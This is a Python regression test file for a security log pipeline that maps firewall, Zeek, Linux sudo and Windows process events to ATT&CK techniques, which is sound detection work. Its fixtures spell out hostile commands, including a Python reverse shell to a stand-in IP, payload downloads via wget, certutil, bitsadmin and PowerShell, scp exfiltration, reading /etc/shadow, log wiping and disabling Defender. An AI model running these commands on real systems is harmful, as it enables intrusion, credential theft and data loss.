"""Regression tests for Part-2 pipeline improvements.

These tests pin down the new parsing, normalization, and ATT&CK-mapping
behaviour added on top of the original deterministic baseline so future
refactors cannot silently regress the corpus evaluation harness.
"""

from __future__ import annotations

import unittest

from src.pipeline import _normalize_event, _parse_structured_payload, run


def _run(raw_log: str) -> dict:
    result = run(raw_log)
    return result.model_dump(mode="json")


def _technique_ids(payload: dict) -> list[str]:
    return [m["technique_id"] for m in payload.get("attack_mapping", [])]


class StructuredPayloadTests(unittest.TestCase):
    def test_zeek_json_is_flattened_into_standard_keys(self) -> None:
        raw = (
            '{"ts":1713409000.0,"uid":"S1029381","id.orig_h":"10.10.50.22",'
            '"id.orig_p":52001,"id.resp_h":"198.51.100.101","id.resp_p":80,'
            '"proto":"tcp","service":"http","duration":1800,'
            '"orig_bytes":45,"resp_bytes":0,"conn_state":"S0"}'
        )
        std = _parse_structured_payload(raw)
        self.assertEqual(std["source_ip"], "10.10.50.22")
        self.assertEqual(std["destination_ip"], "198.51.100.101")
        self.assertEqual(std["service"], "http")
        self.assertEqual(std["conn_state"], "S0")
        self.assertEqual(std["bytes_sent"], 45)
        self.assertEqual(std["bytes_received"], 0)
        self.assertEqual(std["protocol"], "tcp")

    def test_winlogbeat_json_is_flattened_into_standard_keys(self) -> None:
        raw = (
            '{"@timestamp":"2026-04-18T03:10:00.001Z","winlog":{"event_id":"4688",'
            '"event_data":{"NewProcessName":"C:\\\\Windows\\\\System32\\\\cmd.exe",'
            '"CommandLine":"cmd.exe /c powershell.exe -enc QUJDRA==",'
            '"ParentProcessName":"C:\\\\Windows\\\\System32\\\\spoolsv.exe",'
            '"TargetUserName":"alice","IpAddress":"10.0.0.5","LogonType":"3"}}}'
        )
        std = _parse_structured_payload(raw)
        self.assertEqual(std["event_id"], "4688")
        self.assertEqual(std["username"], "alice")
        self.assertEqual(std["logon_type"], "3")
        self.assertIn("cmd.exe", std["process"])
        self.assertIn("-enc", std["command_line"])
        self.assertEqual(std["source_ip"], "10.0.0.5")

    def test_non_json_logs_return_empty_structured(self) -> None:
        self.assertEqual(_parse_structured_payload("user=alice login ok"), {})
        self.assertEqual(_parse_structured_payload(""), {})
        self.assertEqual(_parse_structured_payload("{broken json"), {})
        self.assertEqual(_parse_structured_payload("[]"), {})

    def test_null_markers_are_dropped(self) -> None:
        raw = '{"@timestamp":"NULL","winlog":{"event_id":4624,"event_data":{"TargetUserName":"bob"}}}'
        std = _parse_structured_payload(raw)
        self.assertNotIn("timestamp", std)
        self.assertEqual(std["username"], "bob")


class FortinetNormalizationTests(unittest.TestCase):
    def test_dstip_srcip_service_and_byte_counters_are_captured(self) -> None:
        raw = (
            'date=2026-04-18 time=03:00:01 devname="FW-CORE-01" '
            'devid="FGT60E-SEC-99" logid="0000000013" type="traffic" '
            'srcip=10.10.25.10 srcport=49000 dstip=198.51.100.20 '
            'dstport=53 proto=17 action="accept" service="DNS" '
            "sentbyte=64 rcvdbyte=128"
        )
        event = _normalize_event(raw)
        normalized = event.normalized_event
        self.assertEqual(normalized["source_ip"], "10.10.25.10")
        self.assertEqual(normalized["destination_ip"], "198.51.100.20")
        self.assertEqual(normalized["service"], "DNS")
        self.assertEqual(normalized["destination_port"], "53")
        self.assertEqual(normalized["action"], "accept")
        self.assertEqual(normalized["bytes_sent"], "64")
        self.assertEqual(normalized["bytes_received"], "128")


class SyslogNormalizationTests(unittest.TestCase):
    def test_syslog_prefix_populates_host_program_and_message(self) -> None:
        raw = "Apr 18 03:05:00 srv-linux-01 sshd[4010]: Invalid user support from 198.51.100.45 port 53100"
        normalized = _normalize_event(raw).normalized_event
        self.assertEqual(normalized["hostname"], "srv-linux-01")
        self.assertEqual(normalized["process"], "sshd")
        self.assertEqual(normalized["username"], "support")
        self.assertEqual(normalized["source_ip"], "198.51.100.45")
        self.assertEqual(normalized["event_type"], "failed_login")
        self.assertTrue(normalized["message"].startswith("Invalid user support"))

    def test_sudo_line_extracts_target_user_and_command(self) -> None:
        raw = (
            "Apr 18 03:10:00 srv-linux-01 sudo:    j.doe : TTY=pts/0 ; PWD=/home/j.doe ; "
            "USER=root ; COMMAND=/usr/bin/wget http://198.51.100.150/linpeas.sh -O /tmp/lp.sh"
        )
        normalized = _normalize_event(raw).normalized_event
        self.assertEqual(normalized["username"], "j.doe")
        self.assertEqual(normalized["target_user"], "root")
        self.assertIn("wget http://198.51.100.150", normalized["command_line"])
        # The sudo detection keeps "sudo" as the sudo-specific process rather
        # than the syslog program id "sudo" (they happen to agree here).
        self.assertEqual(normalized["process"], "sudo")


class FirewallMappingTests(unittest.TestCase):
    def test_high_volume_asymmetric_outbound_flags_exfiltration(self) -> None:
        raw = (
            'date=2026-04-18 time=03:10:00 devname="FW-CORE-01" type="traffic" '
            'srcip=10.10.50.22 dstip=198.51.100.150 dstport=443 '
            'action="accept" service="HTTPS" sentbyte=150000000 rcvdbyte=15000'
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1041", ids)

    def test_low_volume_accepted_http_flags_beaconing(self) -> None:
        raw = (
            'date=2026-04-18 time=03:05:00 devname="FW-CORE-01" type="traffic" '
            'srcip=10.10.50.22 dstip=198.51.100.101 dstport=80 '
            'action="accept" service="HTTP" duration=1800 sentbyte=50 rcvdbyte=0'
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1071", ids)

    def test_denied_scan_flags_active_scanning(self) -> None:
        raw = (
            'date=2026-04-18 time=03:05:05 devname="FW-CORE-01" type="traffic" '
            'srcip=10.10.50.22 dstip=198.51.100.102 dstport=443 '
            'action="deny" service="HTTPS" sentbyte=0 rcvdbyte=0'
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1595", ids)

    def test_internal_rdp_with_bulk_traffic_flags_remote_services(self) -> None:
        raw = (
            'date=2026-04-18 time=03:20:10 devname="FW-CORE-01" '
            'srcip=10.10.1.10 dstip=198.51.100.200 dstport=3389 '
            'action="accept" service="RDP" sentbyte=850000 rcvdbyte=1200000'
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1021", ids)


class ZeekMappingTests(unittest.TestCase):
    def test_zeek_http_s0_flags_beaconing_not_scanning(self) -> None:
        raw = (
            '{"ts":1713409000.0,"uid":"S1029381","id.orig_h":"10.10.50.22",'
            '"id.orig_p":52001,"id.resp_h":"198.51.100.101","id.resp_p":80,'
            '"proto":"tcp","service":"http","duration":1800,'
            '"orig_bytes":45,"resp_bytes":0,"conn_state":"S0"}'
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1071", ids)
        self.assertNotIn("T1595", ids)

    def test_zeek_rejected_scan_flags_active_scanning(self) -> None:
        raw = (
            '{"ts":1713409010.01,"uid":"S1029382","id.orig_h":"10.10.50.22",'
            '"id.orig_p":52002,"id.resp_h":"198.51.100.102","id.resp_p":443,'
            '"proto":"tcp","service":"ssl","duration":0.01,'
            '"orig_bytes":150,"resp_bytes":0,"conn_state":"REJ"}'
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1595", ids)

    def test_zeek_massive_orig_bytes_flags_exfiltration(self) -> None:
        raw = (
            '{"ts":1713410000.0,"uid":"M1029381","id.orig_h":"10.10.50.22",'
            '"id.orig_p":54001,"id.resp_h":"198.51.100.150","id.resp_p":443,'
            '"proto":"tcp","service":"ssl","duration":15,'
            '"orig_bytes":150000000,"resp_bytes":15000,"conn_state":"SF"}'
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1041", ids)


class LinuxMappingTests(unittest.TestCase):
    def test_single_sshd_invalid_user_flags_brute_force_candidate(self) -> None:
        raw = "Apr 18 03:05:00 srv-linux-01 sshd[4010]: Invalid user support from 198.51.100.45 port 53100"
        ids = _technique_ids(_run(raw))
        self.assertIn("T1110", ids)

    def test_sudo_reverse_shell_flags_command_interpreter(self) -> None:
        raw = (
            "Apr 18 03:10:05 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; "
            "USER=root ; COMMAND=/usr/bin/python3 -c 'import socket,os,pty;"
            "s=socket.socket();s.connect((\"198.51.100.150\",4444));pty.spawn(\"/bin/bash\")'"
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1059", ids)

    def test_sudo_cat_shadow_flags_credential_dumping(self) -> None:
        raw = (
            "Apr 18 03:10:25 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; "
            "USER=root ; COMMAND=/usr/bin/cat /etc/shadow"
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1003", ids)

    def test_sudo_crontab_flags_scheduled_task(self) -> None:
        raw = (
            "Apr 18 03:10:20 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; "
            "USER=root ; COMMAND=/usr/bin/crontab -e"
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1053", ids)

    def test_sudo_wget_http_flags_ingress_tool_transfer(self) -> None:
        raw = (
            "Apr 18 03:10:10 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; "
            "USER=root ; COMMAND=/usr/bin/wget http://198.51.100.150/linpeas.sh -O /tmp/lp.sh"
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1105", ids)

    def test_sudo_scp_to_external_ip_flags_exfiltration_alt_protocol(self) -> None:
        raw = (
            "Apr 18 03:10:35 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; "
            "USER=root ; COMMAND=/usr/bin/scp /tmp/backup.tar.gz root@198.51.100.150:/tmp/"
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1048", ids)

    def test_sudo_useradd_flags_account_creation(self) -> None:
        raw = (
            "Apr 18 03:10:50 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; "
            "USER=root ; COMMAND=/usr/sbin/useradd -m -p '$1$abc$def' backup_user"
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1136", ids)

    def test_sudo_usermod_flags_account_manipulation(self) -> None:
        raw = (
            "Apr 18 03:10:55 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; "
            "USER=root ; COMMAND=/usr/sbin/usermod -aG sudo backup_user"
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1098", ids)

    def test_sudo_rm_var_log_flags_indicator_removal(self) -> None:
        raw = (
            "Apr 18 03:10:40 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; "
            "USER=root ; COMMAND=/usr/bin/rm -rf /var/log/.log"
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1070", ids)

    def test_sudo_tcpdump_flags_network_sniffing(self) -> None:
        raw = (
            "Apr 18 03:20:10 srv-linux-01 sudo:    j.doe : TTY=pts/0 ; PWD=/home/j.doe ; "
            "USER=root ; COMMAND=/usr/bin/tcpdump -i eth0 -w /tmp/out.pcap"
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1040", ids)

    def test_sudo_find_setuid_flags_abuse_elevation(self) -> None:
        raw = (
            "Apr 18 03:20:20 srv-linux-01 sudo:    deploy : TTY=pts/1 ; PWD=/ ; "
            "USER=root ; COMMAND=/usr/bin/find / -perm -4000"
        )
        ids = _technique_ids(_run(raw))
        self.assertIn("T1548", ids)


class WindowsMappingTests(unittest.TestCase):
    def _wlog(self, command_line: str, new_process: str = "C:\\\\Windows\\\\System32\\\\cmd.exe") -> str:
        return (
            '{"@timestamp":"2026-04-18T03:10:00.001Z","winlog":{"event_id":"4688",'
            '"event_data":{"NewProcessName":"' + new_process + '",'
            '"CommandLine":"' + command_line.replace('"', '\\"') + '",'
            '"ParentProcessName":"C:\\\\Windows\\\\System32\\\\spoolsv.exe"}}}'
        )

    def test_certutil_urlcache_flags_ingress_tool_transfer(self) -> None:
        ids = _technique_ids(_run(self._wlog("certutil -urlcache -f http://198.51.100.150/payload.exe C:\\\\Users\\\\Public\\\\p.exe")))
        self.assertIn("T1105", ids)

    def test_bitsadmin_transfer_flags_bits_jobs_as_primary(self) -> None:
        payload = _run(self._wlog("bitsadmin /transfer myJob http://198.51.100.150/stage2.exe C:\\\\Users\\\\Public\\\\s2.exe"))
        ids = _technique_ids(payload)
        self.assertIn("T1197", ids)
        self.assertIn("T1105", ids)
        self.assertEqual(payload["attack_mapping"][0]["technique_id"], "T1197")

    def test_rundll32_with_dll_flags_system_binary_proxy(self) -> None:
        ids = _technique_ids(_run(self._wlog("rundll32.exe C:\\\\Users\\\\Public\\\\lib.dll,ProcessUpdate")))
        self.assertIn("T1218", ids)

    def test_wmic_shadowcopy_delete_flags_inhibit_recovery(self) -> None:
        ids = _technique_ids(_run(self._wlog("wmic shadowcopy delete")))
        self.assertIn("T1490", ids)

    def test_net_stop_windefend_flags_impair_defenses(self) -> None:
        ids = _technique_ids(_run(self._wlog("net stop WinDefend")))
        self.assertIn("T1562", ids)

    def test_wmic_process_call_create_flags_wmi(self) -> None:
        ids = _technique_ids(_run(self._wlog('wmic process call create "C:\\\\Windows\\\\System32\\\\calc.exe"')))
        self.assertIn("T1047", ids)

    def test_findstr_recursive_non_credential_flags_file_discovery(self) -> None:
        # Non-credential keyword → plain T1083 (File and Directory Discovery).
        ids = _technique_ids(_run(self._wlog("findstr /s /i /p TODO .doc")))
        self.assertIn("T1083", ids)
        self.assertNotIn("T1552", ids)

    def test_findstr_recursive_with_credential_keyword_maps_to_unsecured_creds(self) -> None:
        # Searching for credential keywords promotes the event to T1552
        # (Unsecured Credentials) and suppresses the generic T1083 rule.
        ids = _technique_ids(
            _run(self._wlog("findstr /s /i /p password *.xml"))
        )
        self.assertIn("T1552", ids)
        self.assertNotIn("T1083", ids)
        self.assertEqual(ids[0], "T1552")

    def test_whoami_flags_system_owner_discovery(self) -> None:
        ids = _technique_ids(_run(self._wlog("whoami", new_process="C:\\\\Windows\\\\System32\\\\whoami.exe")))
        self.assertIn("T1033", ids)

    def test_ipconfig_all_flags_network_config_discovery(self) -> None:
        ids = _technique_ids(_run(self._wlog("ipconfig /all", new_process="C:\\\\Windows\\\\System32\\\\ipconfig.exe")))
        self.assertIn("T1016", ids)

    def test_net_user_domain_flags_account_discovery(self) -> None:
        ids = _technique_ids(_run(self._wlog("net user /domain", new_process="C:\\\\Windows\\\\System32\\\\net.exe")))
        self.assertIn("T1087", ids)

    def test_nltest_domain_trusts_flags_trust_discovery(self) -> None:
        ids = _technique_ids(_run(self._wlog("nltest /domain_trusts", new_process="C:\\\\Windows\\\\System32\\\\nltest.exe")))
        self.assertIn("T1482", ids)

    def test_powershell_execution_policy_bypass_flags_command_interpreter(self) -> None:
        ids = _technique_ids(_run(self._wlog(
            "powershell.exe -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://x/')",
            new_process="C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
        )))
        self.assertIn("T1059", ids)

    def test_reg_query_hklm_flags_query_registry(self) -> None:
        ids = _technique_ids(_run(self._wlog("reg query HKLM\\\\Software\\\\Microsoft", new_process="C:\\\\Windows\\\\System32\\\\reg.exe")))
        self.assertIn("T1012", ids)

    def test_systeminfo_flags_system_info_discovery(self) -> None:
        ids = _technique_ids(_run(self._wlog("systeminfo", new_process="C:\\\\Windows\\\\System32\\\\systeminfo.exe")))
        self.assertIn("T1082", ids)

    def test_tasklist_flags_process_discovery(self) -> None:
        ids = _technique_ids(_run(self._wlog("tasklist", new_process="C:\\\\Windows\\\\System32\\\\tasklist.exe")))
        self.assertIn("T1057", ids)


class RegressionSafetyTests(unittest.TestCase):
    def test_malformed_fortinet_is_still_rejected_gracefully(self) -> None:
        raw = 'date=2026-04-18 time=03:15:00 devname= srcip=10.10.25.10 dstip=198.51.100.1 bytes=ERR'
        result = _run(raw)
        # Either an explicit no-mapping status or *some* mapping is
        # acceptable for forward compatibility; we must not crash.
        self.assertIsInstance(result, dict)
        self.assertIn(result["status"], {"mapped", "no_mapping"})

    def test_benign_firewall_dns_does_not_fire_any_rule(self) -> None:
        raw = (
            'date=2026-04-18 time=03:00:01 devname="FW-CORE-01" '
            'devid="FGT60E-SEC-99" type="traffic" srcip=10.10.25.10 '
            'srcport=49000 dstip=198.51.100.20 dstport=53 proto=17 '
            'action="accept" service="DNS" sentbyte=64 rcvdbyte=128'
        )
        payload = _run(raw)
        if payload["status"] == "no_mapping":
            # Explicit no-mapping is the documented benign path.  A real
            # ValidationError would indicate a pipeline bug, not a benign
            # unmapped input, and would have raised above.
            self.assertEqual(payload["attack_mapping"], [])
            return
        # If the pipeline produced anything, it must not be a false exfiltration
        # or beaconing signal on obviously benign DNS.
        ids = _technique_ids(payload)
        self.assertNotIn("T1041", ids)


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
